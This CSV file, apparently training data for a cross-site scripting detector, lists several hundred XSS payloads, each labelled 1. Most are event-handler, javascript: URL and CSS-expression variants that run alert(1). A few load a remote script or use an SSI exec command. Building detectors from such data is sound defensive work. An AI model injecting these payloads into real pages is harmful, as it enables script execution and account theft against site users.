Sentence,Label
<image id=x tabindex=1 onfocusin=alert(1)></image>,1
"<body draggable=""true"" ondragend=""alert(1)"">test</body>",1
<li id=x tabindex=1 onactivate=alert(1)></li>,1
<picture id=x tabindex=1 onbeforedeactivate=alert(1)></picture><input autofocus>,1
"<dfn onclick=""alert(1)"">test</dfn>",1
"<style>@keyframes x{}</style><script style=""animation-name:x"" onanimationstart=""alert(1)""></script>",1
<aside onpointerenter=alert(1)>XSS</aside>,1
url(javascript:alert(''),1
<aside onpointerout=alert(1)>XSS</aside>,1
"<blink onmouseenter=""alert(1)"">test</blink>",1
<form id=x tabindex=1 ondeactivate=alert(1)></form><input id=y autofocus>,1
"<canvas onmouseover=""alert(1)"">test</canvas>",1
<svg><xss onload=alert(1)></xss>,1
"<keygen onmousedown=""alert(1)"">test</keygen>",1
"<sup onmouseup=""alert(1)"">test</sup>",1
<rt onpointerleave=alert(1)>XSS</rt>,1
"<area onkeydown=""alert(1)"" contenteditable>test</area>",1
"<style>:target {transform: rotate(180deg);}</style><xss id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></xss>",1
<strong onpointerleave=alert(1)>XSS</strong>,1
"<q oncut=""alert(1)"" contenteditable>test</q>",1
"<aside oncopy=""alert(1)"" contenteditable>test</aside>",1
"<applet oncontextmenu=""alert(1)"">test</applet>",1
"<big draggable=""true"" ondragleave=""alert(1)"">test</big>",1
"<aside onmouseover=""alert(1)"">test</aside>",1
"<style>@keyframes x{}</style><template style=""animation-name:x"" onanimationend=""alert(1)""></template>",1
"<embed onmousedown=""alert(1)"">test</embed>",1
"<del draggable=""true"" ondrag=""alert(1)"">test</del>",1
"<style>:target {color: red;}</style><element id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></element>",1
"<div oncontextmenu=""alert(1)"">test</div>",1
<main id=x tabindex=1 onactivate=alert(1)></main>,1
<caption onpointermove=alert(1)>XSS</caption>,1
"<spacer onbeforecopy=""alert(1)"" contenteditable>test</spacer>",1
"<element onbeforepaste=""alert(1)"" contenteditable>test</element>",1
<figcaption id=x tabindex=1 ondeactivate=alert(1)></figcaption><input id=y autofocus>,1
"<mark onmouseover=""alert(1)"">test</mark>",1
<menuitem onpointerdown=alert(1)>XSS</menuitem>,1
"<kbd onmouseup=""alert(1)"">test</kbd>",1
<div id=x tabindex=1 ondeactivate=alert(1)></div><input id=y autofocus>,1
"<div draggable=""true"" contenteditable>drag me</div><map ondragover=alert(1) contenteditable>drop here</map>",1
"<multicol draggable=""true"" ondragleave=""alert(1)"">test</multicol>",1
"<samp draggable=""true"" ondragleave=""alert(1)"">test</samp>",1
"<style>@keyframes slidein {}</style><progress style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></progress>",1
<audio id=x tabindex=1 onbeforedeactivate=alert(1)></audio><input autofocus>,1
"<noembed onbeforecopy=""alert(1)"" contenteditable>test</noembed>",1
"document.getElementsByClassName("""").length",1
"<div draggable=""true"" contenteditable>drag me</div><col ondragover=alert(1) contenteditable>drop here</col>",1
"<hr oncut=""alert(1)"" contenteditable>test</hr>",1
<body onpointerenter=alert(1)>XSS</body>,1
"<listing ondblclick=""alert(1)"">test</listing>",1
"<head onbeforecopy=""alert(1)"" contenteditable>test</head>",1
"<div draggable=""true"" contenteditable>drag me</div><kbd ondragover=alert(1) contenteditable>drop here</kbd>",1
"<output onclick=""alert(1)"">test</output>",1
"<footer draggable=""true"" ondrag=""alert(1)"">test</footer>",1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><b id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></b>",1
"<menuitem ondblclick=""alert(1)"">test</menuitem>",1
"<multicol onkeyup=""alert(1)"" contenteditable>test</multicol>",1
<figcaption onpointerout=alert(1)>XSS</figcaption>,1
"<applet draggable=""true"" ondrag=""alert(1)"">test</applet>",1
<label id=x tabindex=1 onbeforeactivate=alert(1)></label>,1
"<aside onkeypress=""alert(1)"" contenteditable>test</aside>",1
"<link draggable=""true"" ondragend=""alert(1)"">test</link>",1
"<multicol draggable=""true"" ondrag=""alert(1)"">test</multicol>",1
"<hgroup onmouseenter=""alert(1)"">test</hgroup>",1
"<!--#exec cmd=""/bin/echo 'IPT SRC=http://.rocks/.js>",1
":ex/**//*/*/pression(alert(""""))'>",1
"<style>:target {transform: rotate(180deg);}</style><option id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></option>",1
"<canvas draggable=""true"" ondrag=""alert(1)"">test</canvas>",1
"<p ondblclick=""alert(1)"">test</p>",1
"<fieldset onmouseup=""alert(1)"">test</fieldset>",1
<wbr id=x tabindex=1 onfocusin=alert(1)></wbr>,1
"<basefont ondblclick=""alert(1)"">test</basefont>",1
"<style>:target {color:red;}</style><optgroup id=x style=""transition:color 1s"" ontransitionend=alert(1)></optgroup>",1
"<small onkeyup=""alert(1)"" contenteditable>test</small>",1
"<label oncopy=""alert(1)"" contenteditable>test</label>",1
"<object onbeforepaste=""alert(1)"" contenteditable>test</object>",1
"<noembed onbeforecut=""alert(1)"" contenteditable>test</noembed>",1
<samp id=x tabindex=1 onbeforeactivate=alert(1)></samp>,1
"<style>@keyframes x{}</style><menuitem style=""animation-name:x"" onanimationstart=""alert(1)""></menuitem>",1
"<dfn onmouseover=""alert(1)"">test</dfn>",1
<th onfocusout=alert(1) tabindex=1 id=x></th><input autofocus>,1
<b id=x tabindex=1 onfocusin=alert(1)></b>,1
"<multicol oncopy=""alert(1)"" contenteditable>test</multicol>",1
"<sub onmousedown=""alert(1)"">test</sub>",1
<h1 onpointerleave=alert(1)>XSS</h1>,1
"<hr draggable=""true"" ondragstart=""alert(1)"">test</hr>",1
"<IMG SRC=""jav	ascript:alert('');"">",1
"<bgsound onkeyup=""alert(1)"" contenteditable>test</bgsound>",1
"<div draggable=""true"" contenteditable>drag me</div><bdi ondragover=alert(1) contenteditable>drop here</bdi>",1
"<figcaption draggable=""true"" ondragleave=""alert(1)"">test</figcaption>",1
"<main onclick=""alert(1)"">test</main>",1
"<mark onkeyup=""alert(1)"" contenteditable>test</mark>",1
"<figcaption onmouseleave=""alert(1)"">test</figcaption>",1
<svg><element onload=alert(1)></element>,1
"<SCRIPT/ SRC=""http://.rocks/.js""></SCRIPT>",1
"<thead onpaste=""alert(1)"" contenteditable>test</thead>",1
"<legend oncut=""alert(1)"" contenteditable>test</legend>",1
<wbr onpointerout=alert(1)>XSS</wbr>,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><canvas id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></canvas>",1
"<style>:target {transform: rotate(180deg);}</style><sub id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></sub>",1
<legend onpointerdown=alert(1)>XSS</legend>,1
<strike onpointerenter=alert(1)>XSS</strike>,1
"<tfoot onmouseleave=""alert(1)"">test</tfoot>",1
"<frameset onmouseenter=""alert(1)"">test</frameset>",1
<menu onpointerdown=alert(1)>XSS</menu>,1
"<abbr onmouseover=""alert(1)"">test</abbr>",1
"<nextid draggable=""true"" ondragend=""alert(1)"">test</nextid>",1
<td onpointerleave=alert(1)>XSS</td>,1
<a onpointermove=alert(1)>XSS</a>,1
"<nav draggable=""true"" ondragleave=""alert(1)"">test</nav>",1
<input type=radio id=x onfocus=alert(1)>,1
<html onpointermove=alert(1)>XSS</html>,1
<body onbeforeprint=alert(1)>,1
<map id=x tabindex=1 ondeactivate=alert(1)></map><input id=y autofocus>,1
"<style>@keyframes x{}</style><cite style=""animation-name:x"" onanimationstart=""alert(1)""></cite>",1
"<span onmouseout=""alert(1)"">test</span>",1
"<div draggable=""true"" contenteditable>drag me</div><applet ondrop=alert(1) contenteditable>drop here</applet>",1
<big onpointerup=alert(1)>XSS</big>,1
"<menu draggable=""true"" ondragstart=""alert(1)"">test</menu>",1
"<span onbeforecut=""alert(1)"" contenteditable>test</span>",1
"<style>:target {color:red;}</style><i id=x style=""transition:color 1s"" ontransitionend=alert(1)></i>",1
"<style>:target {transform: rotate(180deg);}</style><acronym id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></acronym>",1
"<legend onkeypress=""alert(1)"" contenteditable>test</legend>",1
"<big onmouseout=""alert(1)"">test</big>",1
<font onpointerdown=alert(1)>XSS</font>,1
<set onpointermove=alert(1)>XSS</set>,1
<tt onfocusout=alert(1) tabindex=1 id=x></tt><input autofocus>,1
<dl id=x tabindex=1 onfocus=alert(1)></dl>,1
"<object onmouseover=""alert(1)"">test</object>",1
"<object onmouseout=""alert(1)"">test</object>",1
"<style>:target {color: red;}</style><data id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></data>",1
<hgroup onpointerover=alert(1)>XSS</hgroup>,1
"<div draggable=""true"" contenteditable>drag me</div><pre ondrop=alert(1) contenteditable>drop here</pre>",1
"<colgroup onclick=""alert(1)"">test</colgroup>",1
<div onpointerdown=alert(1)>XSS</div>,1
<strike onpointerleave=alert(1)>XSS</strike>,1
"<embed onmousemove=""alert(1)"">test</embed>",1
"<style>@keyframes x{}</style><section style=""animation-name:x"" onanimationstart=""alert(1)""></section>",1
"<element onmousedown=""alert(1)"">test</element>",1
<cite onpointerup=alert(1)>XSS</cite>,1
"<nav draggable=""true"" ondrag=""alert(1)"">test</nav>",1
"<keygen oncopy=""alert(1)"" contenteditable>test</keygen>",1
<button onpointerenter=alert(1)>XSS</button>,1
"<s onbeforepaste=""alert(1)"" contenteditable>test</s>",1
<svg><em onload=alert(1)></em>,1
<svg><animate onend=alert(1) attributeName=x dur=1s>,1
"<small onbeforecopy=""alert(1)"" contenteditable>test</small>",1
"<element draggable=""true"" ondrag=""alert(1)"">test</element>",1
"<style>:target {color: red;}</style><ol id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></ol>",1
"<style onclick=""alert(1)"">test</style>",1
"<video onkeypress=""alert(1)"" contenteditable>test</video>",1
<blockquote id=x tabindex=1 onbeforeactivate=alert(1)></blockquote>,1
"<q onkeypress=""alert(1)"" contenteditable>test</q>",1
<tt id=x tabindex=1 ondeactivate=alert(1)></tt><input id=y autofocus>,1
document.write,1
<embed id=x tabindex=1 onactivate=alert(1)></embed>,1
"<div draggable=""true"" contenteditable>drag me</div><nobr ondragover=alert(1) contenteditable>drop here</nobr>",1
<listing id=x tabindex=1 onactivate=alert(1)></listing>,1
"<article draggable=""true"" ondragend=""alert(1)"">test</article>",1
<span onfocusout=alert(1) tabindex=1 id=x></span><input autofocus>,1
"<strong onmousedown=""alert(1)"">test</strong>",1
"<dt onbeforecut=""alert(1)"" contenteditable>test</dt>",1
"<style>:target {transform: rotate(180deg);}</style><nav id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></nav>",1
<svg><thead onload=alert(1)></thead>,1
"<tbody onmouseenter=""alert(1)"">test</tbody>",1
"<IMG SRC=""`<javascript:alert>`('')""",1
"<source ondblclick=""alert(1)"">test</source>",1
"<command onmousedown=""alert(1)"">test</command>",1
"<li onmouseleave=""alert(1)"">test</li>",1
<wbr onpointermove=alert(1)>XSS</wbr>,1
"<br onmouseout=""alert(1)"">test</br>",1
"<style>:target {color: red;}</style><body id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></body>",1
"<link draggable=""true"" ondragleave=""alert(1)"">test</link>",1
"<template oncut=""alert(1)"" contenteditable>test</template>",1
<iframe onpointermove=alert(1)>XSS</iframe>,1
"<label onmouseover=""alert(1)"">test</label>",1
"<pre oncopy=""alert(1)"" contenteditable>test</pre>",1
"<head onmouseout=""alert(1)"">test</head>",1
<nobr id=x tabindex=1 onfocusin=alert(1)></nobr>,1
"<label onmouseenter=""alert(1)"">test</label>",1
<source onpointerleave=alert(1)>XSS</source>,1
"<big draggable=""true"" ondragenter=""alert(1)"">test</big>",1
"<optgroup oncontextmenu=""alert(1)"">test</optgroup>",1
"<style>@keyframes x{}</style><u style=""animation-name:x"" onanimationstart=""alert(1)""></u>",1
"<style>:target {color:red;}</style><body id=x style=""transition:color 1s"" ontransitionend=alert(1)></body>",1
<a id=x tabindex=1 onactivate=alert(1)></a>,1
<applet id=x tabindex=1 ondeactivate=alert(1)></applet><input id=y autofocus>,1
"<code onbeforecut=""alert(1)"" contenteditable>test</code>",1
<big onfocusout=alert(1) tabindex=1 id=x></big><input autofocus>,1
"<strong onkeypress=""alert(1)"" contenteditable>test</strong>",1
<cite id=x tabindex=1 onfocus=alert(1)></cite>,1
"<i onmouseleave=""alert(1)"">test</i>",1
<command id=x tabindex=1 onbeforedeactivate=alert(1)></command><input autofocus>,1
"<pre onkeypress=""alert(1)"" contenteditable>test</pre>",1
<slot id=x tabindex=1 onactivate=alert(1)></slot>,1
"<style>@keyframes x{}</style><base style=""animation-name:x"" onanimationend=""alert(1)""></base>",1
"SRC=""javascript:alert('')",1
"<slot onbeforecut=""alert(1)"" contenteditable>test</slot>",1
"<ol onkeyup=""alert(1)"" contenteditable>test</ol>",1
<tbody onpointerup=alert(1)>XSS</tbody>,1
<cite id=x tabindex=1 onbeforeactivate=alert(1)></cite>,1
"<del onpaste=""alert(1)"" contenteditable>test</del>",1
"<<SCRIPT>alert("""");//\<</SCRIPT>",1
<spacer id=x tabindex=1 onfocusin=alert(1)></spacer>,1
"<address onbeforecut=""alert(1)"" contenteditable>test</address>",1
"<dt onmouseleave=""alert(1)"">test</dt>",1
"<s onmouseout=""alert(1)"">test</s>",1
<header id=x tabindex=1 onbeforedeactivate=alert(1)></header><input autofocus>,1
"<section onkeydown=""alert(1)"" contenteditable>test</section>",1
"<div draggable=""true"" contenteditable>drag me</div><td ondrop=alert(1) contenteditable>drop here</td>",1
<rp onpointerenter=alert(1)>XSS</rp>,1
"<body onbeforeunload=""location='javascript:alert(1)'"">",1
<svg onload=alert(1)>,1
"<bdo oncontextmenu=""alert(1)"">test</bdo>",1
<article id=x tabindex=1 ondeactivate=alert(1)></article><input id=y autofocus>,1
<bdo onpointerover=alert(1)>XSS</bdo>,1
"<plaintext onpaste=""alert(1)"" contenteditable>test</plaintext>",1
"<track oncontextmenu=""alert(1)"">test</track>",1
"<rp onpaste=""alert(1)"" contenteditable>test</rp>",1
<bgsound onpointerenter=alert(1)>XSS</bgsound>,1
<caption onpointerout=alert(1)>XSS</caption>,1
"setTimeout(\\""writetitle()\\"",$\_GET\[\])",1
<a onfocusout=alert(1) tabindex=1 id=x></a><input autofocus>,1
"<time oncut=""alert(1)"" contenteditable>test</time>",1
"<plaintext draggable=""true"" ondragend=""alert(1)"">test</plaintext>",1
"<th onmouseenter=""alert(1)"">test</th>",1
top[8680439..toString(30)](1),1
"<style>@keyframes slidein {}</style><div style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></div>",1
"<base draggable=""true"" ondragstart=""alert(1)"">test</base>",1
"<slot onkeypress=""alert(1)"" contenteditable>test</slot>",1
"<progress draggable=""true"" ondragleave=""alert(1)"">test</progress>",1
<details ontoggle=alert(1) open>test</details>,1
"<IMG SRC= onmouseover=""alert('xxs')"">",1
<figcaption onpointerenter=alert(1)>XSS</figcaption>,1
"<rb onmouseenter=""alert(1)"">test</rb>",1
<code onpointerout=alert(1)>XSS</code>,1
"<marquee draggable=""true"" ondragend=""alert(1)"">test</marquee>",1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><embed id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></embed>",1
<svg><th onload=alert(1)></th>,1
<input onfocusout=alert(1) id=x><input autofocus>,1
"<noembed onmouseover=""alert(1)"">test</noembed>",1
"<div draggable=""true"" ondragenter=""alert(1)"">test</div>",1
"<shadow draggable=""true"" ondrag=""alert(1)"">test</shadow>",1
"<shadow onkeyup=""alert(1)"" contenteditable>test</shadow>",1
"<embed ondblclick=""alert(1)"">test</embed>",1
"<audio autoplay onplay=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><input id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></input>",1
"<param draggable=""true"" ondragleave=""alert(1)"">test</param>",1
"<xmp draggable=""true"" ondragenter=""alert(1)"">test</xmp>",1
"<abbr oncontextmenu=""alert(1)"">test</abbr>",1
<svg onpointerover=alert(1)>XSS</svg>,1
"<section ondblclick=""alert(1)"">test</section>",1
"<noscript onkeyup=""alert(1)"" contenteditable>test</noscript>",1
<content onpointerup=alert(1)>XSS</content>,1
"<style>:target {transform: rotate(180deg);}</style><legend id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></legend>",1
<li onpointerover=alert(1)>XSS</li>,1
"<noframes draggable=""true"" ondragenter=""alert(1)"">test</noframes>",1
"<source onkeydown=""alert(1)"" contenteditable>test</source>",1
"<pre ondblclick=""alert(1)"">test</pre>",1
"<ul onbeforecopy=""alert(1)"" contenteditable>test</ul>",1
"<cite onbeforepaste=""alert(1)"" contenteditable>test</cite>",1
<svg><canvas onload=alert(1)></canvas>,1
<q onfocusout=alert(1) tabindex=1 id=x></q><input autofocus>,1
"<col onpaste=""alert(1)"" contenteditable>test</col>",1
"<div draggable=""true"" contenteditable>drag me</div><noembed ondragover=alert(1) contenteditable>drop here</noembed>",1
<applet onblur=alert(1) tabindex=1 id=x></applet><input autofocus>,1
"<fieldset onmousedown=""alert(1)"">test</fieldset>",1
"<slot onbeforecopy=""alert(1)"" contenteditable>test</slot>",1
<area onpointerout=alert(1)>XSS</area>,1
"<b draggable=""true"" ondragend=""alert(1)"">test</b>",1
"<ul onkeyup=""alert(1)"" contenteditable>test</ul>",1
<command onpointermove=alert(1)>XSS</command>,1
<svg><dfn onload=alert(1)></dfn>,1
"<video draggable=""true"" ondragenter=""alert(1)"">test</video>",1
<meter onpointerleave=alert(1)>XSS</meter>,1
<rb onblur=alert(1) tabindex=1 id=x></rb><input autofocus>,1
<abbr onpointerenter=alert(1)>XSS</abbr>,1
<thead onpointermove=alert(1)>XSS</thead>,1
<section onpointerover=alert(1)>XSS</section>,1
"<option onmousemove=""alert(1)"">test</option>",1
"<label onkeyup=""alert(1)"" contenteditable>test</label>",1
"<style>@keyframes x{}</style><aside style=""animation-name:x"" onanimationstart=""alert(1)""></aside>",1
"<thead onmouseleave=""alert(1)"">test</thead>",1
"<ul onmousedown=""alert(1)"">test</ul>",1
"<col ondblclick=""alert(1)"">test</col>",1
"<meter oncontextmenu=""alert(1)"">test</meter>",1
"<footer onmouseover=""alert(1)"">test</footer>",1
"<listing onpaste=""alert(1)"" contenteditable>test</listing>",1
"<s draggable=""true"" ondragstart=""alert(1)"">test</s>",1
"<code onkeyup=""alert(1)"" contenteditable>test</code>",1
"<style>@keyframes slidein {}</style><map style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></map>",1
"<video onbeforecut=""alert(1)"" contenteditable>test</video>",1
"<img onclick=""alert(1)"">test</img>",1
<img onpointerdown=alert(1)>XSS</img>,1
"<style>@keyframes x{}</style><acronym style=""animation-name:x"" onanimationstart=""alert(1)""></acronym>",1
javascript:alert(''),1
"<caption onmousemove=""alert(1)"">test</caption>",1
"<kbd oncut=""alert(1)"" contenteditable>test</kbd>",1
<td onpointerout=alert(1)>XSS</td>,1
<wbr onpointerleave=alert(1)>XSS</wbr>,1
"<embed onmouseup=""alert(1)"">test</embed>",1
<wbr id=x tabindex=1 onfocus=alert(1)></wbr>,1
<sub onpointerleave=alert(1)>XSS</sub>,1
"<base onmousedown=""alert(1)"">test</base>",1
document.URL,1
"</TITLE><SCRIPT>alert("""");</SCRIPT>",1
"<style>@keyframes slidein {}</style><keygen style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></keygen>",1
"<style>:target {transform: rotate(180deg);}</style><isindex id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></isindex>",1
"<aside draggable=""true"" ondragenter=""alert(1)"">test</aside>",1
"<caption onbeforecopy=""alert(1)"" contenteditable>test</caption>",1
"<picture ondblclick=""alert(1)"">test</picture>",1
<figcaption onpointerover=alert(1)>XSS</figcaption>,1
"<dir onmouseup=""alert(1)"">test</dir>",1
"<thead onmouseover=""alert(1)"">test</thead>",1
"<bgsound onmouseout=""alert(1)"">test</bgsound>",1
javascript:alert(''),1
"<style>@keyframes x{}</style><meta style=""animation-name:x"" onanimationend=""alert(1)""></meta>",1
<tt id=x tabindex=1 onbeforeactivate=alert(1)></tt>,1
"<input draggable=""true"" ondragstart=""alert(1)"">test</input>",1
"<keygen oncontextmenu=""alert(1)"">test</keygen>",1
"<dd onmouseover=""alert(1)"">test</dd>",1
<img id=x tabindex=1 onfocusin=alert(1)></img>,1
"<section oncontextmenu=""alert(1)"">test</section>",1
"<pre onmouseup=""alert(1)"">test</pre>",1
"<abbr oncut=""alert(1)"" contenteditable>test</abbr>",1
"<hr onmouseup=""alert(1)"">test</hr>",1
<dialog onpointerover=alert(1)>XSS</dialog>,1
"<iframe onmouseup=""alert(1)"">test</iframe>",1
"<blink onmousemove=""alert(1)"">test</blink>",1
"<bgsound onmouseenter=""alert(1)"">test</bgsound>",1
"<plaintext onclick=""alert(1)"">test</plaintext>",1
"<style>:target {color: red;}</style><time id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></time>",1
"<ruby onkeypress=""alert(1)"" contenteditable>test</ruby>",1
"<style>@keyframes x{}</style><button style=""animation-name:x"" onanimationstart=""alert(1)""></button>",1
<param onpointerenter=alert(1)>XSS</param>,1
<svg><main onload=alert(1)></main>,1
<font id=x tabindex=1 onfocusin=alert(1)></font>,1
<small onpointerup=alert(1)>XSS</small>,1
"<head onmousedown=""alert(1)"">test</head>",1
<address id=x tabindex=1 onbeforeactivate=alert(1)></address>,1
"<source draggable=""true"" ondragstart=""alert(1)"">test</source>",1
"<kbd draggable=""true"" ondrag=""alert(1)"">test</kbd>",1
"<div draggable=""true"" contenteditable>drag me</div><nav ondrop=alert(1) contenteditable>drop here</nav>",1
<sub id=x tabindex=1 ondeactivate=alert(1)></sub><input id=y autofocus>,1
"<table onmouseleave=""alert(1)"">test</table>",1
"<style>:target {color: red;}</style><noscript id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></noscript>",1
"<style>:target {transform: rotate(180deg);}</style><figure id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></figure>",1
"<style>:target {transform: rotate(180deg);}</style><center id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></center>",1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><dir id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></dir>",1
"<style>:target {color:red;}</style><base id=x style=""transition:color 1s"" ontransitionend=alert(1)></base>",1
"=""background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029",1
"<summary draggable=""true"" ondragenter=""alert(1)"">test</summary>",1
"<style>:target {transform: rotate(180deg);}</style><area id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></area>",1
<content onpointerleave=alert(1)>XSS</content>,1
<svg onpointerleave=alert(1)>XSS</svg>,1
<blockquote onpointerdown=alert(1)>XSS</blockquote>,1
<textarea onblur=alert(1) id=x></textarea><input autofocus>,1
<svg onfocusout=alert(1) tabindex=1 id=x></svg><input autofocus>,1
"<rtc onbeforepaste=""alert(1)"" contenteditable>test</rtc>",1
<optgroup id=x tabindex=1 onactivate=alert(1)></optgroup>,1
"<datalist onkeyup=""alert(1)"" contenteditable>test</datalist>",1
"<noframes onmouseout=""alert(1)"">test</noframes>",1
"<script oncontextmenu=""alert(1)"">test</script>",1
"<label onmousedown=""alert(1)"">test</label>",1
"<u onbeforecopy=""alert(1)"" contenteditable>test</u>",1
"<p onkeypress=""alert(1)"" contenteditable>test</p>",1
<center onpointerover=alert(1)>XSS</center>,1
<footer onpointerup=alert(1)>XSS</footer>,1
<video onpointerup=alert(1)>XSS</video>,1
<svg><keygen onload=alert(1)></keygen>,1
<samp id=x tabindex=1 onfocusin=alert(1)></samp>,1
"<isindex onpaste=""alert(1)"" contenteditable>test</isindex>",1
"<figcaption ondblclick=""alert(1)"">test</figcaption>",1
"<button onmousemove=""alert(1)"">test</button>",1
"<shadow onkeydown=""alert(1)"" contenteditable>test</shadow>",1
<figure onpointerdown=alert(1)>XSS</figure>,1
"<multicol onkeydown=""alert(1)"" contenteditable>test</multicol>",1
<isindex id=x tabindex=1 onfocusin=alert(1)></isindex>,1
"<style>@keyframes x{}</style><figcaption style=""animation-name:x"" onanimationend=""alert(1)""></figcaption>",1
"<progress draggable=""true"" ondragend=""alert(1)"">test</progress>",1
"<noembed onclick=""alert(1)"">test</noembed>",1
"<hgroup draggable=""true"" ondragenter=""alert(1)"">test</hgroup>",1
"<progress onmousemove=""alert(1)"">test</progress>",1
"<style>:target {transform: rotate(180deg);}</style><rp id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></rp>",1
<command onpointerout=alert(1)>XSS</command>,1
"<figcaption onkeyup=""alert(1)"" contenteditable>test</figcaption>",1
<element id=x tabindex=1 onactivate=alert(1)></element>,1
"<xmp onbeforecut=""alert(1)"" contenteditable>test</xmp>",1
"<samp oncopy=""alert(1)"" contenteditable>test</samp>",1
"<style>:target {color:red;}</style><video id=x style=""transition:color 1s"" ontransitionend=alert(1)></video>",1
"<base ondblclick=""alert(1)"">test</base>",1
"<element draggable=""true"" ondragend=""alert(1)"">test</element>",1
"<map ondblclick=""alert(1)"">test</map>",1
"<output draggable=""true"" ondragenter=""alert(1)"">test</output>",1
<cite id=x tabindex=1 onactivate=alert(1)></cite>,1
<tt onpointerup=alert(1)>XSS</tt>,1
"<audio controls autoplay ontimeupdate=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",1
"<iframe draggable=""true"" ondragenter=""alert(1)"">test</iframe>",1
"<style>:target {color: red;}</style><meter id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></meter>",1
"<blink draggable=""true"" ondragenter=""alert(1)"">test</blink>",1
"<nobr ondblclick=""alert(1)"">test</nobr>",1
"<form onbeforecopy=""alert(1)"" contenteditable>test</form>",1
"<track oncut=""alert(1)"" contenteditable>test</track>",1
"<h1 onmouseout=""alert(1)"">test</h1>",1
<dt id=x tabindex=1 onfocus=alert(1)></dt>,1
"<iframe onclick=""alert(1)"">test</iframe>",1
"<output onmousedown=""alert(1)"">test</output>",1
"<hr draggable=""true"" ondrag=""alert(1)"">test</hr>",1
"<dir draggable=""true"" ondragleave=""alert(1)"">test</dir>",1
"<style>@keyframes x{}</style><footer style=""animation-name:x"" onanimationstart=""alert(1)""></footer>",1
"<i onbeforecut=""alert(1)"" contenteditable>test</i>",1
<svg><colgroup onload=alert(1)></colgroup>,1
"<li onbeforecopy=""alert(1)"" contenteditable>test</li>",1
<input4 onpointerdown=alert(1)>XSS</input4>,1
<ol onpointerup=alert(1)>XSS</ol>,1
<head onblur=alert(1) tabindex=1 id=x></head><input autofocus>,1
"<style>:target {color: red;}</style><tt id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></tt>",1
<input type=checkbox id=x onfocusin=alert(1)>,1
<tfoot id=x tabindex=1 onfocusin=alert(1)></tfoot>,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><form id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></form>",1
"<menuitem draggable=""true"" ondragend=""alert(1)"">test</menuitem>",1
"<li onmousemove=""alert(1)"">test</li>",1
<sub onpointerup=alert(1)>XSS</sub>,1
